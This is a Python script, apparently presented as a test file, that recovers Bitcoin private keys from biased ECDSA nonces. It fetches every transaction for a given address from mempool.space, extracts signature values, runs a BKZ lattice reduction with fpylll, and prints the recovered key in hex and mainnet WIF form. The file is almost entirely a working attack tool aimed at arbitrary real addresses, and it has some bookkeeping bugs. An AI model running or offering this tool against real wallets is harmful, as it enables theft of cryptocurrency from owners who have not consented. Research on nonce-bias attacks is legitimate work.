#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
test_lattice_recovery.py – Recover a Bitcoin private key from ECDSA nonce bias
(Hidden Number Problem) using lattice reduction (BKZ) via fpylll.

Dependencies:
  - fpylll, requests, struct, hashlib
  - btc_sig_utils (provides N and parse_der_sig)
  - coincurve (optional, for address verification)
"""

import sys
import json
import requests
import struct
import hashlib
from typing import List, Dict, Optional, Tuple

try:
    from fpylll import IntegerMatrix, BKZ
    HAVE_FPYLLL = True
except ImportError:
    HAVE_FPYLLL = False

try:
    import coincurve
    HAVE_COINCURVE = True
except ImportError:
    HAVE_COINCURVE = False

# Import group constant and DER parser from local utility module
try:
    from btc_sig_utils import N, parse_der_sig
except ImportError as exc:
    raise SystemExit("Missing 'btc_sig_utils.py' – cannot continue.") from exc


# ---------- Utility: SHA256, varint, sighash ----------
def double_sha256(b: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()

def parse_varint(data: bytes, offset: int) -> Tuple[int, int]:
    b = data[offset]
    if b < 0xfd:
        return b, offset + 1
    elif b == 0xfd:
        return struct.unpack("<H", data[offset+1:offset+3])[0], offset + 3
    elif b == 0xfe:
        return struct.unpack("<I", data[offset+1:offset+5])[0], offset + 5
    else:
        return struct.unpack("<Q", data[offset+1:offset+9])[0], offset + 9

def serialize_varint(value: int) -> bytes:
    if value < 0:
        raise ValueError("negative CompactSize value")
    if value < 0xfd:
        return bytes([value])
    if value <= 0xffff:
        return b"\xfd" + struct.pack("<H", value)
    if value <= 0xffffffff:
        return b"\xfe" + struct.pack("<I", value)
    return b"\xff" + struct.pack("<Q", value)

def parse_tx(raw_tx: bytes) -> Dict:
    offset = 0
    version = raw_tx[offset:offset+4]
    if len(version) != 4:
        raise ValueError("truncated version")
    offset += 4

    is_segwit = raw_tx[offset:offset+2] == b'\x00\x01'
    if is_segwit:
        offset += 2

    txin_count, offset = parse_varint(raw_tx, offset)
    inputs = []
    for _ in range(txin_count):
        outpoint = raw_tx[offset:offset+36]
        if len(outpoint) != 36:
            raise ValueError("truncated outpoint")
        offset += 36
        script_len, offset = parse_varint(raw_tx, offset)
        script = raw_tx[offset:offset+script_len]
        if len(script) != script_len:
            raise ValueError("truncated input script")
        offset += script_len
        sequence = raw_tx[offset:offset+4]
        if len(sequence) != 4:
            raise ValueError("truncated sequence")
        offset += 4
        inputs.append({"outpoint": outpoint, "script": script, "sequence": sequence, "witness": []})

    txout_count, offset = parse_varint(raw_tx, offset)
    outputs = []
    for _ in range(txout_count):
        value = raw_tx[offset:offset+8]
        if len(value) != 8:
            raise ValueError("truncated output value")
        offset += 8
        script_len, offset = parse_varint(raw_tx, offset)
        script = raw_tx[offset:offset+script_len]
        if len(script) != script_len:
            raise ValueError("truncated output script")
        offset += script_len
        outputs.append({"value": value, "script": script})

    if is_segwit:
        for txin in inputs:
            item_count, offset = parse_varint(raw_tx, offset)
            witness = []
            for _ in range(item_count):
                item_len, offset = parse_varint(raw_tx, offset)
                item = raw_tx[offset:offset+item_len]
                if len(item) != item_len:
                    raise ValueError("truncated witness item")
                offset += item_len
                witness.append(item)
            txin["witness"] = witness

    locktime = raw_tx[offset:offset+4]
    if len(locktime) != 4:
        raise ValueError("truncated locktime")
    offset += 4
    if offset != len(raw_tx):
        raise ValueError("trailing transaction bytes")

    return {
        "version": version,
        "is_segwit": is_segwit,
        "inputs": inputs,
        "outputs": outputs,
        "locktime": locktime,
    }

def serialize_outputs(outputs: List[Dict]) -> bytes:
    data = bytearray(serialize_varint(len(outputs)))
    data += serialize_outputs_payload(outputs)
    return bytes(data)

def serialize_outputs_payload(outputs: List[Dict]) -> bytes:
    data = bytearray()
    for txout in outputs:
        data += txout["value"]
        data += serialize_varint(len(txout["script"]))
        data += txout["script"]
    return bytes(data)

def legacy_sighash(raw_tx: bytes, input_index: int, script_code: bytes, sighash: int) -> Optional[int]:
    """Compute z (message hash) for a legacy (non‑SegWit) input."""
    try:
        if sighash != 0x01:
            return None
        tx = parse_tx(raw_tx)
        if tx["is_segwit"]:
            return None
        if input_index >= len(tx["inputs"]):
            return None
        inputs_data = bytearray()
        for i, txin in enumerate(tx["inputs"]):
            script_payload = script_code if i == input_index else b""
            inputs_data += txin["outpoint"]
            inputs_data += serialize_varint(len(script_payload))
            inputs_data += script_payload
            inputs_data += txin["sequence"]

        preimage = (
            tx["version"] +
            serialize_varint(len(tx["inputs"])) +
            inputs_data +
            serialize_outputs(tx["outputs"]) +
            tx["locktime"] +
            struct.pack("<I", sighash)
        )
        return int.from_bytes(double_sha256(preimage), 'big')
    except Exception:
        return None

def segwit_sighash(raw_tx: bytes, input_index: int, script_code: bytes, amount: int, sighash: int) -> Optional[int]:
    """Compute z for a SegWit (BIP143) input."""
    try:
        if sighash != 0x01:
            return None
        tx = parse_tx(raw_tx)
        if not tx["is_segwit"] or input_index >= len(tx["inputs"]):
            return None

        prevouts = bytearray()
        sequences = bytearray()
        for txin in tx["inputs"]:
            prevouts += txin["outpoint"]
            sequences += txin["sequence"]

        hash_prevouts = double_sha256(prevouts)
        hash_sequences = double_sha256(sequences)
        hash_outputs = double_sha256(serialize_outputs_payload(tx["outputs"]))

        preimage = (
            tx["version"] +
            hash_prevouts +
            hash_sequences +
            tx["inputs"][input_index]["outpoint"] +
            script_code +
            struct.pack("<Q", amount) +
            tx["inputs"][input_index]["sequence"] +
            hash_outputs +
            tx["locktime"] +
            struct.pack("<I", sighash)
        )
        return int.from_bytes(double_sha256(preimage), 'big')
    except Exception:
        return None


# ---------- Helper: extract script pushes ----------
def scriptsig_pushes(script_hex: str) -> List[bytes]:
    if not script_hex:
        return []
    b = bytes.fromhex(script_hex)
    i, chunks = 0, []
    while i < len(b):
        op = b[i]
        i += 1
        if op <= 75:
            d = b[i:i+op]
            i += op
            chunks.append(d)
        elif op == 0x4c:
            ln = b[i]
            i += 1
            d = b[i:i+ln]
            i += ln
            chunks.append(d)
        elif op == 0x4d:
            ln = int.from_bytes(b[i:i+2], 'little')
            i += 2
            d = b[i:i+ln]
            i += ln
            chunks.append(d)
        elif op == 0x4e:
            ln = int.from_bytes(b[i:i+4], 'little')
            i += 4
            d = b[i:i+ln]
            i += ln
            chunks.append(d)
        else:
            break
    return chunks


# ---------- Data fetcher (with debug) ----------
def fetch_raw_tx_bytes(txid: str) -> Optional[bytes]:
    url = f"https://mempool.space/api/tx/{txid}/hex"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            return bytes.fromhex(resp.text.strip())
    except Exception:
        pass
    return None

def append_signature_tuple(
    signatures: List[Dict],
    *,
    txid: str,
    vin: int,
    script_type: str,
    r: int,
    s: int,
    z: int,
    sighash: int,
    pubkey: Optional[bytes],
) -> None:
    signatures.append({
        "txid": txid,
        "vin": vin,
        "script_type": script_type,
        "r": r,
        "s": s,
        "z": z,
        "sighash": sighash,
        "pubkey": pubkey.hex() if pubkey else None,
    })

def fetch_local_blockchain_data(address: str) -> List[Dict]:
    print(f"[*] Fetching transactions for address: {address}")
    signatures = []
    debug_skipped = []

    url = f"https://mempool.space/api/address/{address}/txs"
    last_txid = None
    while True:
        try:
            page_url = url if last_txid is None else f"{url}?after_txid={last_txid}"
            resp = requests.get(page_url, timeout=15)
            if resp.status_code != 200:
                break
            txs = resp.json()
            if not txs:
                break
        except Exception as e:
            print(f"[!] Error fetching transactions: {e}")
            break

        for tx in txs:
            txid = tx.get("txid")
            if not txid:
                continue
            raw_tx = fetch_raw_tx_bytes(txid)
            if not raw_tx:
                debug_skipped.append(f"{txid}: raw_tx fetch failed")
                continue

            is_segwit = (len(raw_tx) > 4 and raw_tx[4:6] == b'\x00\x01')

            for vin_idx, vin in enumerate(tx.get("vin", [])):
                prevout = vin.get("prevout")
                if not prevout:
                    debug_skipped.append(f"{txid}:{vin_idx} coinbase")
                    continue

                addr_in_prevout = prevout.get("scriptpubkey_address") or prevout.get("address")
                if addr_in_prevout != address:
                    debug_skipped.append(f"{txid}:{vin_idx} address mismatch ({addr_in_prevout})")
                    continue

                prev_spk = prevout.get("scriptpubkey", "")
                if not prev_spk:
                    debug_skipped.append(f"{txid}:{vin_idx} no prev_spk")
                    continue
                prev_script = bytes.fromhex(prev_spk)
                amount = prevout.get("value", 0)

                if is_segwit:
                    witness = vin.get("witness", [])
                    if not witness:
                        debug_skipped.append(f"{txid}:{vin_idx} SegWit no witness")
                        continue
                    # P2WPKH
                    if len(prev_script) == 22 and prev_script[:2] == b'\x00\x14':
                        sig_hex = witness[0]
                        if not sig_hex:
                            debug_skipped.append(f"{txid}:{vin_idx} P2WPKH no sig")
                            continue
                        pkh = prev_script[2:22]
                        script_code = b'\x19\x76\xa9\x14' + pkh + b'\x88\xac'
                        try:
                            r, s, sighash = parse_der_sig(sig_hex)
                        except Exception:
                            debug_skipped.append(f"{txid}:{vin_idx} P2WPKH bad DER")
                            continue
                        z = segwit_sighash(raw_tx, vin_idx, script_code, amount, sighash)
                        if z is not None:
                            pubkey = bytes.fromhex(witness[1]) if len(witness) > 1 else None
                            append_signature_tuple(
                                signatures,
                                txid=txid,
                                vin=vin_idx,
                                script_type="p2wpkh",
                                r=r,
                                s=s,
                                z=z,
                                sighash=sighash,
                                pubkey=pubkey,
                            )
                        else:
                            debug_skipped.append(f"{txid}:{vin_idx} P2WPKH sighash failed")
                    # P2WSH
                    elif len(prev_script) == 34 and prev_script[:2] == b'\x00\x20':
                        witness_script = witness[-1]
                        for item in witness[:-1]:
                            try:
                                r, s, sighash_flag = parse_der_sig(item)
                            except Exception:
                                continue
                            script_code = bytes.fromhex(witness_script)
                            z = segwit_sighash(raw_tx, vin_idx, script_code, amount, sighash_flag)
                            if z is not None:
                                signatures.append({"r": r, "s": s, "z": z})
                        if not any(sig.get('r') for sig in signatures if sig.get('txid') == txid):
                            debug_skipped.append(f"{txid}:{vin_idx} P2WSH no valid sigs")
                    else:
                        debug_skipped.append(f"{txid}:{vin_idx} unknown SegWit script type")
                else:
                    scriptsig = vin.get("scriptsig", "")
                    if not scriptsig:
                        debug_skipped.append(f"{txid}:{vin_idx} no scriptsig")
                        continue
                    pushes = scriptsig_pushes(scriptsig)
                    if not pushes:
                        debug_skipped.append(f"{txid}:{vin_idx} no pushes")
                        continue

                    prev_type = None
                    if prev_spk.startswith("76a914") and len(prev_spk) == 50 and prev_spk.endswith("88ac"):
                        prev_type = "p2pkh"
                    elif prev_spk.startswith("a914") and len(prev_spk) == 46 and prev_spk.endswith("87"):
                        prev_type = "p2sh"
                    elif prev_spk.startswith("21") or prev_spk.startswith("41"):
                        prev_type = "p2pk"
                    else:
                        debug_skipped.append(f"{txid}:{vin_idx} unknown legacy type")
                        continue

                    if prev_type == "p2pkh":
                        # scriptSig: <sig> <pubkey> -> signature is first push
                        if len(pushes) < 2:
                            debug_skipped.append(f"{txid}:{vin_idx} P2PKH too few pushes")
                            continue
                        sig_candidate = pushes[0].hex()
                        script_code = prev_script
                        try:
                            r, s, sighash_flag = parse_der_sig(sig_candidate)
                        except Exception:
                            debug_skipped.append(f"{txid}:{vin_idx} P2PKH bad DER")
                            continue
                        z = legacy_sighash(raw_tx, vin_idx, script_code, sighash_flag)
                        if z is not None:
                            signatures.append({"r": r, "s": s, "z": z})
                        else:
                            debug_skipped.append(f"{txid}:{vin_idx} P2PKH sighash failed")
                    elif prev_type == "p2sh":
                        # scriptSig: OP_0 <sig1> <sig2> ... <redeemScript>
                        redeem_script = pushes[-1]
                        for push in pushes[:-1]:
                            if push == b'':
                                continue
                            try:
                                r, s, sighash_flag = parse_der_sig(push.hex())
                            except Exception:
                                continue
                            z = legacy_sighash(raw_tx, vin_idx, redeem_script, sighash_flag)
                            if z is not None:
                                signatures.append({"r": r, "s": s, "z": z})
                        if not any(sig.get('r') for sig in signatures if sig.get('txid') == txid):
                            debug_skipped.append(f"{txid}:{vin_idx} P2SH no valid sigs")
                    elif prev_type == "p2pk":
                        if not pushes:
                            debug_skipped.append(f"{txid}:{vin_idx} P2PK no pushes")
                            continue
                        sig_candidate = pushes[0].hex()
                        script_code = prev_script
                        try:
                            r, s, sighash_flag = parse_der_sig(sig_candidate)
                        except Exception:
                            debug_skipped.append(f"{txid}:{vin_idx} P2PK bad DER")
                            continue
                        z = legacy_sighash(raw_tx, vin_idx, script_code, sighash_flag)
                        if z is not None:
                            signatures.append({"r": r, "s": s, "z": z})
                        else:
                            debug_skipped.append(f"{txid}:{vin_idx} P2PK sighash failed")

        if len(txs) < 25:
            break

        last_txid = txs[-1].get("txid")
        if not last_txid:
            break

    if debug_skipped:
        print("[*] Debug summary (first 20 skipped reasons):")
        for reason in debug_skipped[:20]:
            print(f"    {reason}")
        if len(debug_skipped) > 20:
            print(f"    ... and {len(debug_skipped)-20} more")
    print(f"[+] Parsed {len(signatures)} valid (r, s, z) tuples.")
    return signatures


# ---------- Lattice attack (fixed bugs) ----------
def solve_biased_hnp(signatures: List[Dict], bits_known: int = 8) -> Optional[int]:
    if not HAVE_FPYLLL:
        print("[!] fpylll not available – install it first.")
        return None

    q = N
    m = len(signatures)
    if m < 5:
        print("[!] Need at least 5 signatures for a reliable recovery.")
        return None

    dim = m + 2
    matrix = IntegerMatrix(dim, dim)

    X = 1 << (256 - bits_known)
    K = q // X

    for i, sig in enumerate(signatures):
        r, s, z = sig['r'], sig['s'], sig['z']
        s_inv = pow(s, -1, q)
        t = (r * s_inv) % q
        u = (z * s_inv) % q

        matrix[i, i] = q
        matrix[m, i] = t
        matrix[m + 1, i] = u

    matrix[m, m] = K
    matrix[m + 1, m + 1] = 1

    block_size = 20 if m > 30 else 30
    print(f"[*] Running BKZ-{block_size} reduction on {dim}x{dim} matrix...")
    BKZ.reduction(matrix, BKZ.Param(block_size=block_size))
    print("[+] Reduction complete. Checking rows for a valid solution...")

    best_passes = 0
    best_pass_rate = 0.0
    candidates_found = 0
    best_x_candidate = None

    for row in range(dim):
        scaled_x = matrix[row, m]
        if scaled_x == 0 or scaled_x % K != 0:
            continue
        potential_x = abs(scaled_x // K) % q
        if potential_x == 0:
            continue

        # Verify against a strong majority of signatures (90%+ must have top bits zero)
        passes = sum(
            1 for sig in signatures
            if (((sig['z'] + sig['r'] * potential_x) * pow(sig['s'], -1, q)) % q
                >> (256 - bits_known) == 0)
        )
        pass_rate = passes / len(signatures) if signatures else 0
        candidates_found += 1
        
        if pass_rate > best_pass_rate:
            best_pass_rate = pass_rate
            best_passes = passes
            best_x_candidate = potential_x
        
        # Require 90%+ pass rate for valid key (allowing minimal noise)
        if passes >= len(signatures) * 0.9:
            return potential_x

    if candidates_found > 0:
        print(f"[*] Checked {candidates_found} candidate solutions. Best pass rate: {best_passes}/{len(signatures)} ({best_pass_rate*100:.1f}%)")
        
        # Show k-bit distribution for best candidate to diagnose bias
        if best_x_candidate is not None:
            k_top_bits = []
            for sig in signatures[:min(20, len(signatures))]:
                k = ((sig['z'] + sig['r'] * best_x_candidate) * pow(sig['s'], -1, q)) % q
                top_bits = k >> (256 - bits_known)
                k_top_bits.append(top_bits)
            print(f"[*] Top {bits_known} bits of k (first 20 sigs): {k_top_bits[:20]}")
    else:
        print("[*] No valid candidate solutions found in lattice rows.")

    return None


# ---------- WIF conversion (pure Python) ----------
BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def base58_encode(data: bytes) -> str:
    if not data:
        return ""
    zeros = 0
    for b in data:
        if b == 0:
            zeros += 1
        else:
            break
    num = int.from_bytes(data, 'big')
    result = ""
    while num > 0:
        num, rem = divmod(num, 58)
        result = BASE58_ALPHABET[rem] + result
    return "1" * zeros + result

def private_key_hex_to_wif(private_key_hex: str, compressed: bool = True, mainnet: bool = True) -> str:
    private_key_hex = private_key_hex.strip().lower()
    if len(private_key_hex) < 64:
        private_key_hex = private_key_hex.zfill(64)
    elif len(private_key_hex) > 64:
        raise ValueError("Private key hex is too long (max 64 chars).")
    private_key_bytes = bytes.fromhex(private_key_hex)
    prefix = b'\x80' if mainnet else b'\xEF'
    payload = prefix + private_key_bytes + (b'\x01' if compressed else b'')
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    wif_data = payload + checksum
    return base58_encode(wif_data)


# ---------- Address derivation (requires coincurve) ----------
def private_key_to_address(priv_hex: str, compressed: bool = True) -> str:
    """Derive P2PKH address from private key hex (mainnet)."""
    if not HAVE_COINCURVE:
        raise ImportError("coincurve required for address derivation")
    priv_bytes = bytes.fromhex(priv_hex)
    pub = coincurve.PublicKey.from_secret(priv_bytes)
    pub_bytes = pub.format(compressed=compressed)
    h160 = hashlib.new('ripemd160', hashlib.sha256(pub_bytes).digest()).digest()
    payload = b'\x00' + h160
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58_encode(payload + checksum)


# ---------- main ----------
def main():
    if len(sys.argv) < 2:
        print("Usage: python3 test_lattice_recovery.py <bitcoin_address>")
        sys.exit(1)

    address = sys.argv[1]
    signatures = fetch_local_blockchain_data(address)

    if not signatures:
        print("[X] No usable signatures found for this address.")
        print("[*] Make sure the address has at least 5 outgoing transactions.")
        sys.exit(1)

    recovered_key = solve_biased_hnp(signatures, bits_known=8)

    if recovered_key:
        key_hex = f"{recovered_key:064x}"
        wif_comp = private_key_hex_to_wif(key_hex, compressed=True, mainnet=True)
        wif_uncomp = private_key_hex_to_wif(key_hex, compressed=False, mainnet=True)

        print("\n" + "="*60)
        print("[🔥 SUCCESS] Private key recovered:")
        print(f"HEX (64 char): {key_hex}")
        print(f"WIF (compressed)   : {wif_comp}")
        print(f"WIF (uncompressed) : {wif_uncomp}")

        # --- Address verification ---
        if HAVE_COINCURVE:
            try:
                addr_comp = private_key_to_address(key_hex, compressed=True)
                addr_uncomp = private_key_to_address(key_hex, compressed=False)
                if addr_comp == address or addr_uncomp == address:
                    print("[✓] Address verification PASSED – recovered key matches target address.")
                else:
                    print("[!] Address verification FAILED – recovered key does NOT match target address.")
                    print(f"    Target address         : {address}")
                    print(f"    Derived (compressed)   : {addr_comp}")
                    print(f"    Derived (uncompressed) : {addr_uncomp}")
            except Exception as e:
                print(f"[!] Address verification error: {e}")
        else:
            print("[!] coincurve not installed – skipping address verification.")

        print("="*60 + "\n")
    else:
        print("\n[❌ FAIL] Lattice reduction completed but no key was recovered.")
        print("[*] Possible reasons: insufficient signatures, or no bias present.\n")

if __name__ == "__main__":
    main()
